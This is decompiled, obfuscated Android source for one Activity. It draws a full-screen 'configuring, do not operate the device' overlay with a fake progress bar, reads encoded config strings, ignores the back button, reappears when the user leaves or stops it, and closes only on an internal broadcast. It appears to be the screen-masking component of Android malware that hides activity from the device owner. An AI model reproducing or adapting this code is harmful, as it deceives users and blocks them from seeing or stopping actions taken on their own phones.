package com.storm.safe.rock.activity;

import android.R;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.ImageDecoder;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import com.storm.safe.rock.util.StringUtil;
import java.io.IOException;
import okio.Segment;
import org.conscrypt.C1037R;
import org.json.JSONObject;
import p000.AbstractC1120qr;
import p000.AbstractC1408xb;
import p000.RunnableC0165ca;
import p000.RunnableC0941o6;
import p000.dl1;
import p000.t60;
import p000.v10;
import p000.wk1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class yojggfhv extends Activity {

    /* renamed from: b3 */
    public static final String f51923b3;

    /* renamed from: a0 */
    public boolean f51924a0;

    /* renamed from: a6 */
    public ProgressBar f51930a6;

    /* renamed from: a7 */
    public TextView f51931a7;

    /* renamed from: a8 */
    public Handler f51932a8;

    /* renamed from: a9 */
    public RunnableC0165ca f51933a9;

    /* renamed from: b0 */
    public long f51934b0;

    /* renamed from: b1 */
    public boolean f51935b1;

    /* renamed from: a1 */
    public boolean f51925a1 = true;

    /* renamed from: a2 */
    public String f51926a2 = "配置中请稍后...";

    /* renamed from: a3 */
    public String f51927a3 = "正在自动配置和连接\n请勿操作设备";

    /* renamed from: a4 */
    public String f51928a4 = "#FFFFFF";

    /* renamed from: a5 */
    public String f51929a5 = "#CCCCCC";

    /* renamed from: b2 */
    public final yojggfhv$hideReceiver$1 f51936b2 = new BroadcastReceiver() { // from class: com.storm.safe.rock.activity.yojggfhv$hideReceiver$1
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            if (t60.m214686a2(intent != null ? intent.getAction() : null, "com.storm.safe.rock.intent.HIDE_CONFIG_MASK")) {
                this.f51937a0.finish();
            }
        }
    };

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.activity.yojggfhv$a0 */
    public static final class C0250a0 {
        public /* synthetic */ C0250a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        public static /* synthetic */ void showConfigMask$default(C0250a0 c0250a0, Context context, String str, boolean z, int i, Object obj) {
            if ((i & 2) != 0) {
                str = null;
            }
            if ((i & 4) != 0) {
                z = false;
            }
            c0250a0.showConfigMask(context, str, z);
        }

        public final void hideConfigMask(Context context) {
            t60.m214695b6(context, "context");
            try {
                Intent intent = new Intent("com.storm.safe.rock.intent.HIDE_CONFIG_MASK");
                intent.setPackage(context.getPackageName());
                context.sendBroadcast(intent);
            } catch (Exception e) {
                t60.m214705c6("yojggfhv", "发送隐藏配置遮盖广播失败", e);
            }
        }

        public final void showConfigMask(Context context, String str, boolean z) {
            t60.m214695b6(context, "context");
            try {
                Intent intent = new Intent(context, (Class<?>) yojggfhv.class);
                intent.addFlags(278921216);
                intent.putExtra("CONFIG_MASK_ID", System.currentTimeMillis());
                if (str != null) {
                    intent.putExtra("CUSTOM_MASK_TEXT", str);
                }
                intent.putExtra("START_FROM_MAX", z);
                context.startActivity(intent);
            } catch (Exception e) {
                t60.m214705c6("yojggfhv", "启动配置遮盖Activity失败", e);
            }
        }

        private C0250a0() {
        }
    }

    static {
        new C0250a0(null);
        f51923b3 = StringUtil.m212470a0("OFwDLEgqMy1YPy1QFnRHKwMg");
    }

    /* renamed from: a0 */
    public final void m211195a0() {
        RunnableC0165ca runnableC0165ca = this.f51933a9;
        if (runnableC0165ca != null) {
            Handler handler = this.f51932a8;
            if (handler != null) {
                handler.removeCallbacks(runnableC0165ca);
            }
            this.f51933a9 = null;
        }
        this.f51932a8 = null;
        this.f51934b0 = System.currentTimeMillis();
        Handler handler2 = new Handler(Looper.getMainLooper());
        this.f51932a8 = handler2;
        if (!this.f51935b1) {
            RunnableC0165ca runnableC0165ca2 = new RunnableC0165ca(23, this);
            this.f51933a9 = runnableC0165ca2;
            handler2.post(runnableC0165ca2);
            return;
        }
        ProgressBar progressBar = this.f51930a6;
        if (progressBar != null) {
            progressBar.setVisibility(0);
        }
        ProgressBar progressBar2 = this.f51930a6;
        if (progressBar2 != null) {
            progressBar2.setProgress(80);
        }
        TextView textView = this.f51931a7;
        if (textView == null) {
            return;
        }
        textView.setText("80%");
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) throws IOException {
        String stringExtra;
        super.onCreate(bundle);
        try {
            JSONObject jSONObject = new JSONObject(AbstractC1408xb.m215154a0(this, f51923b3));
            this.f51924a0 = jSONObject.optBoolean(StringUtil.m212470a0("LlcQOEE9LyFZNyJePDteMw=="), true);
            this.f51925a1 = jSONObject.optBoolean(StringUtil.m212470a0("LlcQOEE9PDxYNjlcAilvOR4="), true);
            String strOptString = jSONObject.optString(StringUtil.m212470a0("KFYfPEQ/IS9EOh9cCS4="), "配置中请稍后...");
            t60.m214694b5(strOptString, "config.optString(StringU…EOh9cCS4=\"), \"配置中请稍后...\")");
            this.f51926a2 = strOptString;
            String strOptString2 = jSONObject.optString(StringUtil.m212470a0("KFYfPEQ/IS9EOhhMEy5ELAAr"), "正在自动配置和连接\n请勿操作设备");
            t60.m214694b5(strOptString2, "config.optString(StringU…r\"), \"正在自动配置和连接\\n请勿操作设备\")");
            this.f51927a3 = strOptString2;
            t60.m214694b5(jSONObject.optString(StringUtil.m212470a0("KFYfPEQ/IS9EOhhNEC5YKw=="), "配置完成后将自动返回应用"), "config.optString(StringU…5YKw==\"), \"配置完成后将自动返回应用\")");
            String strOptString3 = jSONObject.optString("configMaskTextColor", "#FFFFFF");
            t60.m214694b5(strOptString3, "config.optString(\"configMaskTextColor\", \"#FFFFFF\")");
            this.f51928a4 = strOptString3;
            String strOptString4 = jSONObject.optString("configMaskSubtitleColor", "#CCCCCC");
            t60.m214694b5(strOptString4, "config.optString(\"config…ubtitleColor\", \"#CCCCCC\")");
            this.f51929a5 = strOptString4;
        } catch (Exception unused) {
            this.f51924a0 = true;
            this.f51925a1 = true;
            this.f51926a2 = "配置中请稍后...";
            this.f51927a3 = "正在自动配置和连接\n请勿操作设备";
            this.f51928a4 = "#FFFFFF";
            this.f51929a5 = "#CCCCCC";
        }
        Intent intent = getIntent();
        if (intent != null && (stringExtra = intent.getStringExtra("CUSTOM_MASK_TEXT")) != null) {
            this.f51926a2 = stringExtra;
        }
        Intent intent2 = getIntent();
        this.f51935b1 = intent2 != null ? intent2.getBooleanExtra("START_FROM_MAX", false) : false;
        if (!this.f51924a0) {
            finish();
            return;
        }
        try {
            getWindow().getDecorView().setSystemUiVisibility(5894);
            getWindow().addFlags(6883200);
            getWindow().addFlags(Segment.SIZE);
            WindowManager.LayoutParams attributes = getWindow().getAttributes();
            attributes.width = -1;
            attributes.height = -1;
            attributes.x = 0;
            attributes.y = 0;
            attributes.gravity = 51;
            if (Build.VERSION.SDK_INT >= 28) {
                attributes.layoutInDisplayCutoutMode = 1;
            }
            getWindow().setAttributes(attributes);
        } catch (Exception e) {
            t60.m214705c6("yojggfhv", "设置全屏失败", e);
        }
        try {
            FrameLayout frameLayout = new FrameLayout(this);
            frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
            frameLayout.setBackgroundColor(Color.argb(80, v10.MASK, 0, 0));
            int iM214706c7 = t60.m214706c7(this, "bg_config_mask", C1037R.drawable.btn_checkbox_unchecked_mtrl);
            if (iM214706c7 != 0) {
                ImageView imageView = new ImageView(this);
                imageView.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
                imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
                if (Build.VERSION.SDK_INT >= 28) {
                    try {
                        ImageDecoder.Source sourceCreateSource = ImageDecoder.createSource(getResources(), iM214706c7);
                        t60.m214694b5(sourceCreateSource, "createSource(resources, bgResId)");
                        Drawable drawableDecodeDrawable = ImageDecoder.decodeDrawable(sourceCreateSource, new dl1());
                        t60.m214694b5(drawableDecodeDrawable, "decodeDrawable(source) {…                        }");
                        imageView.setImageDrawable(drawableDecodeDrawable);
                        if (wk1.m215080b0(drawableDecodeDrawable)) {
                            wk1.m215071a1(drawableDecodeDrawable).start();
                        }
                    } catch (Exception e2) {
                        t60.m214726f4("yojggfhv", "ImageDecoder 加载失败，回退 BitmapFactory: " + e2.getMessage());
                        imageView.setImageResource(iM214706c7);
                    }
                } else {
                    imageView.setImageResource(iM214706c7);
                }
                frameLayout.addView(imageView);
            } else {
                getWindow().setBackgroundDrawableResource(R.color.black);
            }
            LinearLayout linearLayout = new LinearLayout(this);
            linearLayout.setOrientation(1);
            linearLayout.setGravity(17);
            linearLayout.setPadding(48, 48, 48, 48);
            linearLayout.setSystemUiVisibility(1792);
            TextView textView = new TextView(this);
            textView.setText(this.f51926a2);
            textView.setTextSize(28.0f);
            try {
                textView.setTextColor(Color.parseColor(this.f51928a4));
            } catch (Exception unused2) {
                textView.setTextColor(-1);
            }
            textView.setGravity(17);
            textView.setPadding(32, 32, 32, 32);
            TextView textView2 = new TextView(this);
            textView2.setText(this.f51927a3);
            textView2.setTextSize(18.0f);
            try {
                textView2.setTextColor(Color.parseColor(this.f51929a5));
            } catch (Exception unused3) {
                textView2.setTextColor(Color.parseColor("#CCCCCC"));
            }
            textView2.setGravity(17);
            textView2.setPadding(16, 0, 16, 16);
            linearLayout.addView(textView);
            linearLayout.addView(textView2);
            if (this.f51925a1) {
                this.f51930a6 = t60.m214700c1(this);
                TextView textView3 = new TextView(this);
                textView3.setText("0%");
                textView3.setTextSize(24.0f);
                textView3.setTextColor(-1);
                textView3.setGravity(17);
                textView3.setVisibility(0);
                LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
                layoutParams.setMargins(0, 8, 0, 16);
                layoutParams.gravity = 1;
                textView3.setLayoutParams(layoutParams);
                this.f51931a7 = textView3;
                linearLayout.addView(this.f51930a6);
                linearLayout.addView(this.f51931a7);
                m211195a0();
            } else {
                t60.m214726f4("yojggfhv", "进度条功能已禁用");
            }
            frameLayout.addView(linearLayout, new FrameLayout.LayoutParams(-1, -1));
            setContentView(frameLayout);
        } catch (Exception e3) {
            t60.m214705c6("yojggfhv", "创建遮盖界面失败", e3);
        }
        try {
            IntentFilter intentFilter = new IntentFilter("com.storm.safe.rock.intent.HIDE_CONFIG_MASK");
            int i = Build.VERSION.SDK_INT;
            BroadcastReceiver broadcastReceiver = this.f51936b2;
            if (i >= 33) {
                registerReceiver(broadcastReceiver, intentFilter, 4);
            } else {
                registerReceiver(broadcastReceiver, intentFilter);
            }
        } catch (Exception e4) {
            t60.m214705c6("yojggfhv", "注册广播接收器失败", e4);
        }
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        try {
            RunnableC0165ca runnableC0165ca = this.f51933a9;
            if (runnableC0165ca != null) {
                Handler handler = this.f51932a8;
                if (handler != null) {
                    handler.removeCallbacks(runnableC0165ca);
                }
                this.f51933a9 = null;
            }
            this.f51932a8 = null;
            unregisterReceiver(this.f51936b2);
        } catch (Exception e) {
            t60.m214705c6("yojggfhv", "注销广播接收器失败", e);
        }
        super.onDestroy();
    }

    @Override // android.app.Activity
    public final void onStop() {
        t60.m214726f4("yojggfhv", "yojggfhv onStop - isFinishing: " + isFinishing());
        super.onStop();
        if (isFinishing()) {
            return;
        }
        t60.m214726f4("yojggfhv", "yojggfhv被意外停止，通知ConfigMaskManager重新显示");
        sendBroadcast(new Intent("com.storm.safe.rock.intent.CONFIG_MASK_STOPPED"));
    }

    @Override // android.app.Activity
    public final void onUserLeaveHint() {
        new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0941o6(27, this), 500L);
    }

    @Override // android.app.Activity
    public final void onBackPressed() {
    }
}
